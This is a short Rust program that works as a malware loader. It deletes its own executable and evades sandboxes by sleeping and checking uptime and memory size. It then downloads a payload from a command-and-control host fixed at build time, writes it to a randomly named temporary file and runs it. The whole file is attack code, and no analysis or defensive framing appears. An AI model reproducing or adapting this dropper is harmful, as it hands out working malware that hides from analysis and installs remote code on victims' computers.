use std::{
    env::{consts::EXE_SUFFIX, temp_dir},
    iter::repeat_with,
    process::Command,
    time,
};

fn main() {
    let _ = houdini::disappear();

    // Basic anti-sandbox checks
    std::thread::sleep(time::Duration::from_secs(60));

    if psutil::host::uptime().unwrap() < time::Duration::from_secs(60 * 60) {
        return;
    }

    if psutil::memory::virtual_memory().unwrap().total() < 2 * 1024u64.pow(3) {
        return;
    }

    let mut resp = ureq::get(fmtools::format!(
        "http://"{env!("C2")}"/payloads/payload"{EXE_SUFFIX}
    ))
    .call()
    .unwrap();
    let payload = resp.body_mut().read_to_string().unwrap();

    let path = temp_dir().join(
        (repeat_with(fastrand::alphanumeric))
            .take(15)
            .collect::<String>(),
    );
    std::fs::write(&path, payload.as_bytes()).unwrap();

    Command::new(path.to_str().unwrap()).spawn().unwrap();
}
